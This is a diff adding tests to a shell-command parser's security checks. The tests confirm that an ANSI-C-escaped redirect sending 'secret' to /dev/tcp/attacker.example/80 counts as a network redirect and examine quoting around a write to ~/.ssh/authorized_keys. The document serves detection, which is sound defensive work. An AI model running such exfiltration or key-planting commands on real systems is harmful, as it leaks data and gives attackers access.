@@ -317,6 +317,22 @@ describe("Shell Parser", () => {
           expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
         }
       });
+
+      test("decodes ANSI-C escapes in the target", async () => {
+        const result = await parse(
+          "echo secret > $'/dev/\\x74cp/attacker.example/80'",
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("keeps backslashes literal inside quotes", async () => {
+        for (const command of [
+          "echo x > '/dev/\\tcp/host/80'",
+          'echo x > "/dev/\\tcp/host/80"',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(false);
+        }
+      });
     });
 
     // sensitive_redirect
@@ -354,6 +370,13 @@ describe("Shell Parser", () => {
         expect(
           result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
         ).toBe(true);
+      });
+
+      test("treats a quoted tilde as a literal directory", async () => {
+        const result = await parse("echo key > '~/.ssh/authorized_keys'");
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(false);
       });
 
       test("detects redirect to ~/.gnupg/", async () => {
